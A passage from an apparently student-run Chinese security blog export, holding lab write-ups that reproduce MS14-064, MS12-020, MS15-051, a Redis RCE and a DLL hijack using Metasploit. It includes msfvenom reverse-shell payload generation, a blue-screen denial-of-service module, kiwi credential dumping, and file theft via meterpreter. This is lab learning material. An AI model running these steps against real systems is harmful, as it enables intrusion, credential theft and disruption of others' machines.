          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆栈溢出 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms14-064漏洞复现</title>
      <link href="2020/08/18/ms14-064-lou-dong-fu-xian/"/>
      <url>2020/08/18/ms14-064-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>这是我在实验室学习渗透测试的第五个漏洞复现，一个多小时便完成了。学长给的要求只需完成查看靶机信息、在指定位置创建文件夹两项操作，我在看别的博客时发现还可以利用该漏洞窃取文件，因此也自己尝试了以下，写在了博客的最后。</p><h2 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h2><p>MS14-064/CVE-2014-6332为Windows OLE自动化阵列远程代码执行漏洞。当IE不作访问内存中的对象时，存在远程代码执行漏洞。OLE（对象链接与嵌入）是一种允许应用程序共享数据和功能的技术，远程攻击者利用此漏洞通过构造的网站执行任意代码，用户使用IE浏览器查看该网站时允许远程执行代码。</p><p>受影响的产品有：</p><ul><li>Windows Server 2003</li><li>Windows Server 2008</li><li>Windows Server 2008 R2</li><li>Windows Vista</li><li>Windows XP</li><li>Windows 7</li><li>Windows 8</li><li>Windows 8.1</li><li>Windows Server 2012</li><li>Windows Server 2012 R2</li><li>Windows  RT</li><li>Windows  RT 8.1</li></ul><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：Kali Linux: 192.168.227.128</p><p>靶机：Windows Server 2008: 192.168.227.130</p><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol><li>使用<code>msfconsole</code>命令启动msf，搜索ms14-064的漏洞信息。</li></ol>   <ol start="2"><li><p>使用第一个攻击模块，设置载荷</p><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell">use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>browser<span class="token operator">/</span>ms14_064_ole_code_execution <span class="token comment"># 使用第一个攻击模块</span>show payloads <span class="token comment"># 查看有效的攻击载荷</span><span class="token function">set</span> payload windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_tcp <span class="token comment"># 设置反弹连接shell</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后使用<code>show options</code>命令查看需要进行的设置。其中，AllowPowershellPrompt、SRVHOST和LHOST需要修改。AllowPowershellPrompt改为true，其余两个改为攻击机IP。设置完成后，使用<code>exploit</code>命令生成恶意网站。</p></li></ol>   <ol start="3"><li>使用靶机用IE浏览器打开生成的恶意链接</li></ol>   <ol start="4"><li>返回Kali，已经生成了一个连接session了，按一下回车，输入<code>sessions -i 1</code>连接，入侵靶机，打开shell，如果乱码，则使用<code>chcp 65001</code>改变编码，然后输入<code>whoami</code>查看当前用户。（第一次失败了，我推断可能是修改了编码的原因，因为第二次打开shell后没有修改编码，发现成功了，之后又尝试了修改编码后输入<code>whoami</code>，依然不成功）</li></ol>   <ol start="5"><li>尝试在桌面上创建一个名为test的文件夹：</li></ol>   <p>   返回windows server 2008查看，桌面上已经出现了相应的文件夹：</p>   <ol start="6"><li><p>尝试从靶机窃取文件</p><p>在桌面创建一个名为secret的文件夹：</p></li></ol>   <p>   使用dir命令查看，存在secret.txt文件，返回meterpreter，使用download命令下载文件：</p>   <p>   下载完成后，在目标目录下查看，存在，说明窃取成功：</p>   ]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms12-020死亡蓝屏漏洞复现</title>
      <link href="2020/08/15/ms12-020-si-wang-lan-ping-lou-dong-fu-xian/"/>
      <url>2020/08/15/ms12-020-si-wang-lan-ping-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>本博客记录了ms12-020死亡蓝屏漏洞复现的全过程，本实验是我在实验室学习渗透测试的第四个实验。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：Kali Linux 192.168.227.128</p><p>靶机：Windows Server 2008 192.168.227.130</p><h2 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h2><ol><li><p>打开攻击机和靶机，在攻击机Kali使用nmap扫描工具查看靶机是否开启3389端口。结果为已开启。</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nmap <span class="token number">192.168</span>.227.130<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li></ol>   <ol start="2"><li><p>启动msfconsole，查看是否存在ms12-020漏洞。</p><p>查询模块如下：</p></li></ol>   <p>   其中，上面的是具体的攻击模块，下面的是检查模块。首先使用第二个模块来检查，建立目标地址后运行，检测到存在ms12-020漏洞（The target is vulnerable）。</p>   <ol start="3"><li>使用第一个攻击模块，设置目标地址后运行，观察到靶机蓝屏，Kali终端显示“seems down”，说明攻击成功。</li></ol>      <p>这一步出现了一些问题。kali终端提示“Checking RDP status”后，尽管靶机蓝屏，但是命令行报错，随后靶机自动重启。我最初以为是防火墙没关的原因，可关闭后仍然不可以。最后觉得可能是靶机自动关机了，因此连接中断。我的解决方法是在靶机中，通过“计算机–&gt;属性–&gt;远程设置–&gt;高级–&gt;启动和故障恢复–&gt;设置–&gt;关闭自动重新启动”。</p><p>并不是每一次攻击都可以成功，可能要多试几次才可以。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 死亡蓝屏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ms15-051提权实验复现</title>
      <link href="2020/08/10/ms15-051-ti-quan-shi-yan-fu-xian/"/>
      <url>2020/08/10/ms15-051-ti-quan-shi-yan-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>这是我在实验室学习渗透测试的第三个实验，用了大概三个小时完成的，明显越来越熟练了。尽管里面很多原理还并不太清楚，但随着做的漏洞复现越来越多，知道的东西也随之增加。</p><p>另外，今天也学到了markdown中的注释语法：</p><pre class="line-numbers language-markd" data-language="markd"><code class="language-markd">[^_^]: 要注释的句子<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>您看这个表情可不可爱？</p><p>好了，废话不多说，我们进入正题。本博客记录了我进行ms15-051提权实验复现的全过程。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a>Metasploit</h3><p>Metasploit是一款开源的渗透测试工具，可以帮助安全员发现漏洞问题，此工具带有的攻击模块可以帮助安全员简单的利用相关的漏洞。</p><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><p>本实验通过Metasploit对内网机器进行渗透，并且使用ms15-051进行权限提升，获取Window Server 2008的SYSTEM权限，最后进行远程控制。</p><h3 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h3><blockquote><p>Metasploit框架使Metasploit具有良好的扩展性，它的控制接口负责发现漏洞、攻击漏洞、提交漏洞，然后通过一些接口加入攻击后处理工具和报表工具。Metasploit框架可以从一个漏洞扫描程序导入数据，使用关于有漏洞主机的详细信息来发现可攻击漏洞，然后使用有效载荷对系统发起攻击。所有这些操作都可以通过Metasploit的Web界面进行管理，而它只是其中一种管理接口，另外还有命令行工具和一些商业工具等。攻击者可以将漏洞扫描程序的结果导入到Metasploit框架的开源安全工具Armitage中，然后通过Metasploit的模块来确定漏洞。一旦发现了漏洞，攻击者就可以采取一种可行方法攻击系统，通过Shell或启动Metasploit的meterpreter来控制这个系统。这些有效载荷就是在获得本地系统访问后执行的一系列命令。这个过程需要参考一些文档并使用一些数据库技术，在发现漏洞之后开发一种可行的攻击方法，其中有效载荷数据库包含用于提取本地系统密码、安装其他软件或控制硬件等的模块，这些功能很象以前BO2K等工具所具备的功能。</p><footer><strong>A_dmin</strong><cite><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42967398/article/details/100777498">ms15-051提权</a></cite></footer></blockquote><h3 id="漏洞CVE-2015-1701"><a href="#漏洞CVE-2015-1701" class="headerlink" title="漏洞CVE-2015-1701"></a>漏洞CVE-2015-1701</h3><p>受影响的系统：</p><ul><li>Windows Vista</li><li>WIndows Server 2012 R2</li><li>WIndows Server  2012</li><li>WIndows Server  2008 R2</li><li>WIndows Server  2008</li><li>WIndows Server  2003</li><li>WIndows RT 8.1</li><li>Windows RT</li><li>Windows 8.1</li><li>Windows 8</li><li>Windows 7</li></ul><p><strong>漏洞成因</strong>：Win32.k.sys内核模式驱动程序没有正确处理内存对象，在实现上存在权限提升漏洞</p><p><strong>漏洞危害</strong>：成功利用此漏洞可使攻击者在内核模式中运行任意代码。</p><p><strong>漏洞利用</strong>：攻击者必须具有有效的登陆凭证，并且可以本地登录以利用此漏洞。</p><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><p>攻击机：Kali Linux</p><p>靶机：Windows Server 2008</p><h2 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h2><ol><li>使用msfvenom生成木马</li></ol><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp <span class="token assign-left variable">lhost</span><span class="token operator">=</span>攻击机IP <span class="token assign-left variable">lport</span><span class="token operator">=</span><span class="token number">4444</span> -f exe <span class="token operator">&gt;</span> shell.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>安装<a target="_blank" rel="noopener" href="https://www.apachefriends.org/zh_cn/download.html">xampp</a>，并启动。（我安装在了/opt下）</li></ol>      <ol start="3"><li><p>把生成的木马挂在服务器上等待靶机下载</p><p>在opt/lampp/htdocs/下创建目录shell，提升shell及其所有文件和子目录的权限为所有人可读可写可执行。<a target="_blank" rel="noopener" href="https://www.runoob.com/linux/linux-comm-chmod.html">chmod命令用法</a>。</p></li><li><p>把生成的木马复制到网站目录</p></li><li><p>使用msf的handler模块</p></li><li><p>设置payload及其参数</p><p>payload要和木马的payload一致（即windows/meterpreter/reverse_tcp）</p></li></ol><ol start="7"><li><p>重新启动网站</p><p>不要关闭原来的终端，新建终端，重新启动网站。</p></li></ol>   <ol start="8"><li>打开靶机windows server 2008，访问<code>http://攻击机IP/shell</code>，下载木马shell.exe（先将该网站加入受信任的站点）。下载完成后，运行。</li></ol>      <ol start="9"><li>返回攻击机，已成功获取靶机的shell，getuid可查看当前权限</li></ol>   <ol start="10"><li><p>使用ms15-051漏洞，进一步获取system更高权限</p><p>首先输入backgroud，把会话切换进后台，之后：</p><p><a href="!%5B%5D(ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/001.png)">^_^</a>:<img src="ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/013.png"></p></li><li><p>设置payload及其参数</p><p><a href="!%5B%5D(ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/001.png)">^_^</a>:<img src="ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/014.png"></p></li><li><p>键入<code>run</code>以攻击，<code>getuid</code>以并查看当前权限。</p><p><a href="!%5B%5D(ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/001.png)">^_^</a>:<img src="ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/015.png"></p><p>攻击成功，并且当前已是SYSTEM用户。靶机的IP地址为192.168.227.130（后面要用）。</p></li><li><p>加载kiwi，获取用户密码</p><p>如果是windows server 2003，则加载mimikatz，因为我用的靶机为windows server 2008，因此需要用kiwi。其他系统你可以先加载mimikatz，根据提示选择你要加载什么（下图中，我最先加载的是mimikatz，它提示我应该使用kiwi来代替）。</p><p><a href="!%5B%5D(ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/001.png)">^_^</a>:<img src="ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/016.png"></p><p>因为我没有给用户设置密码，所以Password一列均为空（这里其实需要设置密码的，后面会讲到）。</p></li><li><p>远程连接靶机</p><p>首先在windows server 2008进行如下设置，允许运行任意版本远程桌面的计算机连接。</p><p><a href="!%5B%5D(ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/001.png)">^_^</a>:<img src="ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/017.png"></p><p>然后回到攻击机，新建一个终端，输入<code>rdesktop 靶机IP</code>，远程连接靶机。</p><p><a href="!%5B%5D(ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/001.png)">^_^</a>:<img src="ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/018.png"></p><p>由于rdesktop不支持无密码登录，因此我此时并不能使用用户名zxy登录。所以只能先返回windows，在服务管理器中为用户名为zxy的用户设置密码。</p><p><a href="!%5B%5D(ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/001.png)">^_^</a>:<img src="ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/019.png"></p><p>再次返回攻击机，使用rdesktop命令远程连接主机，点击“其他用户”，输入用户名zxy和刚刚设置的密码后，连接成功：</p><p><a href="!%5B%5D(ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/001.png)">^_^</a>:<img src="ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/020.png"></p></li><li><p>成功入侵靶机，查看IP和用户。</p><p><a href="!%5B%5D(ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/001.png)">^_^</a>:<img src="ms15-051%E6%8F%90%E6%9D%83%E5%AE%9E%E9%AA%8C%E5%A4%8D%E7%8E%B0/021.png"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis远程命令执行漏洞复现</title>
      <link href="2020/08/08/redis-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian/"/>
      <url>2020/08/08/redis-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>前两天电脑又被我搞坏了，昨天重装了下系统，下载了需要的东西，今天下午在kali上安装了grassmarlin，然后就开始做这个漏洞复现。这是我在实验室学习渗透测试过程中的第二个漏洞复现。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><h3 id="Redis简介"><a href="#Redis简介" class="headerlink" title="Redis简介"></a>Redis简介</h3><p>Redis是一个高性能的key-value存储系统，支持多种value类型，提供了Java, C/C++, C#, PHP, JavaScript, Perl, Object-C, Python, Ruby, Erlang等客户端。</p><h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li>攻击机：Kali 192.168.227.128</li><li>靶机：Kali 192.168.227.129</li><li>影响范围：Redis4.x、5.x</li></ul><h2 id="靶机安装Redis包"><a href="#靶机安装Redis包" class="headerlink" title="靶机安装Redis包"></a>靶机安装Redis包</h2><ol><li><p>下载Redis包：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">wget</span> download.redis.io/releases/redis-4.0.11.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>解压安装包</p><pre class="line-numbers language-none"><code class="language-none">tar xzvf redis-4.0.11.tar.gz<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当前目录下会出现一个名为``redis-4.0.11`的文件夹。</p></li><li><p>make安装</p><p>进入文件夹，在usr/local/redis目录下安装redis：</p><pre class="line-numbers language-none"><code class="language-none">make PREFIX=/usr/local/redis install<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后命令行刷屏，等待一会后，出现如下提示，安装结束：</p></li><li><p>检查安装是否有问题</p><p>安装命令行提示，输入：</p><pre class="line-numbers language-none"><code class="language-none">make test<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>等待一会儿，若出现以下提示，说明测试通过，安装已完成：</p></li><li><p>拷贝源码中的redis.conf到/usr/local/redis中</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">cp</span> /redis-4.0.11/redis.conf /usr/local/redis<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>修改redis.conf</p><p>进入/usr/local/redis目录，打开redis.conf，做出以下修改：</p><ul><li>找到未注释的<code>bind 127.0.0.1</code>，并注释掉</li><li>修改<code>protected-mode</code>属性为<code>no</code>（可通过IP访问）</li><li>修改<code>daemonize</code>属性为<code>yes</code>(标识redis以后台方式启动)</li></ul></li><li><p>服务端启动服务</p><p>进入/usr/local/redis/bin目录下，执行如下命令：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">./redis-server /usr/local/redis/redis.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果如下：</p></li><li><p>启动客户端连接并测试</p><p>同样在bin目录下，执行如下命令：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">./redis-cli<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果如下：</p></li></ol><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>攻击机中需要下载<a target="_blank" rel="noopener" href="https://github.com/n0b0dyCN/RedisModules-ExecuteCommand">RedisModules-ExecuteCommand</a>和<a target="_blank" rel="noopener" href="https://github.com/Ridter/redis-rce">poc</a>。</p><ol><li><p>下载RedisModules-ExecuteCommand</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后进入RedisModules-ExcuteCommand目录，直接make编译：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>下载poc</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://github.com/Ridter/redis-rce.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>复制</p><p>将RedisMoudules-ExecuteCommand/src下的modules.so文件复制到poc目录（redis-rce）下。</p></li><li><p>安装需要的库</p><p>我在运行redis.rce.py时，提示我缺少<code>six</code>这个库，需要pip安装。首先安装pip: </p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> https://bootstrap.pypa.io/get-pip.py -o get-pip.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完成后，当前目录下会出现一个get-pip.py文件，运行后就可以使用pip了：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python get-pip.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后就可以安装需要的库：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">pip <span class="token function">install</span> six<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>运行poc</p><p>在redis-rce目录下，命令行键入：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">Python redis-rce.py -r 目标机ip -L 攻击机ip -f module.so<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果如下：</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 远程代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>工控软件DLL劫持漏洞复现</title>
      <link href="2020/08/06/gong-kong-ruan-jian-dll-jie-chi-lou-dong-fu-xian/"/>
      <url>2020/08/06/gong-kong-ruan-jian-dll-jie-chi-lou-dong-fu-xian/</url>
      
        <content type="html"><![CDATA[<p>紧张刺激前所未有突如其来惨绝人寰的线上期末考试结束了，我也要开始做实验室的工作了，这学期因为学姐在准备毕业，我也划水了好久，中间只做过一些小任务，那么这个暑假就要把该还的帐还清了（突然泪目）。</p><p>我在期末考试前和博士联系过了，说自己想要学习渗透测试方面的内容，那么第一个任务就是复现DLL劫持。谨以此博，纪念我考后生还（划掉）的第一个小任务。</p><span id="more"></span><p>啊啊啊啊正在做的时候那个新带我的学长跟我说他也试了下，没实现…没事，我尽管做我自己的。</p><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ol><li><strong>DLL</strong>：动态链接库。是Windows操作系统中实现二进制级共享函数库的编程和运行环境。</li><li><strong>Windows平台可执行文件执行过程</strong>：Windows平台上当一个可执行文件运行时，加载器将可执行文件映射到进程的地址空间中，加载器分析文件的输入表，查找出需要的DLL，并逐个将它们映射到进程的地址空间中，最后初始化并开始运行，在运行过程中会调用加载到内存中的DLL所包含的功能函数。</li><li><strong>DLL劫持</strong>：由于可执行文件的输入表只提供了DLL的名称，没有其他详细信息，当查找的过程中发生了冒名顶替时间，就发生了劫持。黑客可以伪造接口相同功能不同的同名DLL，放在可执行文件运行优先查找的路径上，就能冒名顶替使黑客目标功能的DLL被加载到内存并被调用执行。</li></ol><h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><h3 id="1-安装Kali-Linux虚拟机"><a href="#1-安装Kali-Linux虚拟机" class="headerlink" title="1. 安装Kali Linux虚拟机"></a>1. 安装Kali Linux虚拟机</h3><p>Kali用得好，牢饭吃到饱…啊不是，工具无罪。</p><p>Kali之前安装过，还在上面配置了Mulval（攻击图项目的第一个任务），所以这次也是轻车熟路，除了中间“选择安装软件”可能是因为网络问题吧，失败了两次。</p><p>如何在VMWare上安装Kali Linux 2020.2版本的虚拟机详见<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44143678/article/details/106265389">该文</a>。</p><h3 id="2-安装Windows-XP-SP3靶机"><a href="#2-安装Windows-XP-SP3靶机" class="headerlink" title="2. 安装Windows XP SP3靶机"></a>2. 安装Windows XP SP3靶机</h3><p>本来我想用我家那台十年前的机器（前段时间升级了下内存和硬盘，还能用），但又怕搞坏了不好交代，所以还是老老实实下虚拟机吧。</p><p>这个在官网没找到资源，就随便在其他地方找了个资源，安全性无法保证，凑活着用吧。</p><p>具体安装过程…傻瓜式操作应该不需要教程吧？</p><p>界面提示我大概要二三十分钟，实际过程没那么长，一局游戏都没打完呢…</p><h3 id="3-在XP上安装需要的软件"><a href="#3-在XP上安装需要的软件" class="headerlink" title="3. 在XP上安装需要的软件"></a>3. 在XP上安装需要的软件</h3><p>首先是<a target="_blank" rel="noopener" href="http://www.realinfo.com.cn/html/software/Realinfo/index.html">紫金桥监控组态软件 V6.5</a>。我在xp上打不开这个网站，所以就在win10下下载后利用vmtools（xp系统搭建好后自动下载了vmtools，挺省心的）将该软件复制了过来。</p><p>另外也要安装<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/sysinternals/downloads/process-explorer">Process Explorer</a>。</p><h3 id="4-寻找可劫持进程ProgMan-exe的DLL"><a href="#4-寻找可劫持进程ProgMan-exe的DLL" class="headerlink" title="4. 寻找可劫持进程ProgMan.exe的DLL"></a>4. 寻找可劫持进程ProgMan.exe的DLL</h3><p>开启进程ProgMan.exe(即紫金桥监控组态软件，在安装目录下可以找到该执行文件)，打开procexp。其实两者无关先后。在procexp下可以看到ProgMan.exe进程，然后按照我的选项配置，可以看到下面的窗口。</p><p>与注册表相对比：</p><p>这说明我们的ws2help.dll满足dll劫持的要求。</p><h3 id="5-生成源码CPP文件和dll文件"><a href="#5-生成源码CPP文件和dll文件" class="headerlink" title="5. 生成源码CPP文件和dll文件"></a>5. 生成源码CPP文件和dll文件</h3><p>首先要配置Python2.7环境，这个不必多说。安装好后，pip下载所需要的包pefile，这个包没多大，没必要再换源了。下载好后，在Github上下载我们需要的一个<a target="_blank" rel="noopener" href="https://github.com/coca1ne/DLL_Hijacker">DLL_Hijacker.py</a>文件，然后cd到该文件所在位置，在命令行中执行：</p><pre class="line-numbers language-none"><code class="language-none">DLL_Hijacker.py c:\WINDOWS\system32\ws2help.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>结果如下：</p><p>同时，在该目录下，ws2help.cpp文件也已经生成了。</p><p>然后将ws2help.cpp编译为ws2help.dll。这一步需要用到VC++6.0，推荐直接在靶机中安装（Win10不太兼容）。具体步骤如下：</p><ol><li><p>在VC++ 6.0中新建一个Win32 Dynamic-Link Library工程，名称任意。</p></li><li><p>创建一个简单的DLL工程</p></li><li><p>将ws2help.cpp中的代码复制到该工程Source File文件夹下的XXX.cpp(XXX为工程名)文件中，注意加上如图所示的头文件。</p></li><li><p>如果刚开始就直接编译ws2help.cpp，会报错，解决方法是先编译同目录下的StdAfx.cpp文件，没有错误后再编译ws2help.cpp。编译方法为“组建–&gt;编译xxx.cpp”。</p></li><li><p>编译无误后，点击“组建–&gt;组建xxx.dll”，正确完成后，可以在工程目录下的Debug文件夹下找到生成的dll文件。</p></li></ol><p>之后，将该dll文件放入与progman.exe同一目录下，再次打开ProgMan.exe，会有弹窗提示。</p><h3 id="6-利用msf基于dll劫持实现权限提升"><a href="#6-利用msf基于dll劫持实现权限提升" class="headerlink" title="6. 利用msf基于dll劫持实现权限提升"></a>6. 利用msf基于dll劫持实现权限提升</h3><p>进入kali，检查msfvenom是否正常（在命令行中输入<code>msfvenom</code>）。若正常，则在命令行键入：</p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;本机IP&gt; LPORT=1234 -f dll &gt;/root/ws2help.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后，会在root下生成我们需要的ws2help.dll文件，将该文件拷贝到靶机（XP）下。这一步可能会比较麻烦，可以将该文件放入压缩包内，再进行复制粘贴。</p><p>在Kali命令行中输入<code>msfconsole</code>开启msf，利用msf中的handler模块开启监听：</p><p>在靶机中开启进程ProgMan.exe，利用<a target="_blank" rel="noopener" href="https://github.com/sxd0216/DLL-hijacking-">Dllinject.exe</a>，将ws2help.dll注入到进程。这里好像对ws2help.dll和Dllinject.exe的位置也有要求，最开始我把它们俩同时放在ProgMan.exe所在目录下，但Dllinject.exe无法正常运行。之后我把ws2help.dll放在桌面，Dllinject.exe放在其他目录下，可以正常运行了。</p><p>找到ProgMan进程，点击注入，注入时要选择ws2help.dll所在位置，其他不用填。回到Kali，发现已经提权成功了。</p><p>实验结束。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本实验对于刚刚接触渗透测试的我来说，说难也不难，但也确实花了很长时间，主要就是在编译cpp文件为dll时出了问题。我一直在尝试在命令行界面直接通过g++命令来进行编译，但结果总是错误的。最终，在王博士的提示下，我用了VC++6.0来进行编译。一开始也出了问题，因为VC++6.0版本过于古老，和Win10不兼容，无论我怎么编译，都会报错。在网上查到了解决方法，但一一尝试后，都没有用。最后只得下载了Win7虚拟机，别问我为什么不直接在Win XP下下载，因为我一开始以为XP也不兼容…嘛，反正都解决啦，不管那么多啦！</p><p>这只是渗透测试之路的起点，就遇到了难啃的硬骨头，以后会遇到多少麻烦可想而知，但我相信自己可以坚持学下去，加油！</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> dll劫持 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用Hexo写博客的一些小技巧</title>
      <link href="2020/08/04/shi-yong-hexo-xie-bo-ke-de-yi-xie-xiao-ji-qiao/"/>
      <url>2020/08/04/shi-yong-hexo-xie-bo-ke-de-yi-xie-xiao-ji-qiao/</url>
      
        <content type="html"><![CDATA[<p>我在研究如何在Hexo中引用本地图片时，在<a target="_blank" rel="noopener" href="https://www.cnblogs.com/bce1100/p/10438436.html">这篇博客</a>中看到<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/docs/">官方文档</a>对此问题已给出了解决方法，并亲测有效。当然，我并不满足于仅仅知道这一个技巧。在大致阅读过官方文档后，我总结了之前我个人并不知道的几个关于Hexo写博客的小技巧。</p><h2 id="1-post与draft"><a href="#1-post与draft" class="headerlink" title="1. post与draft"></a>1. post与draft</h2><p>我们在创建新的文章时，往往使用这条命令：</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">hexo new <span class="token punctuation">[</span>layout<span class="token punctuation">]</span> <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>例如：</p><pre class="line-numbers language-she" data-language="she"><code class="language-she">hexo new helloworld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>layout</code>若缺省，则默认为<code>post</code>，因此我们可以在source文件夹下看到有一个_posts文件夹，所有创建的文章都会放在这里。当我们<code>hexo 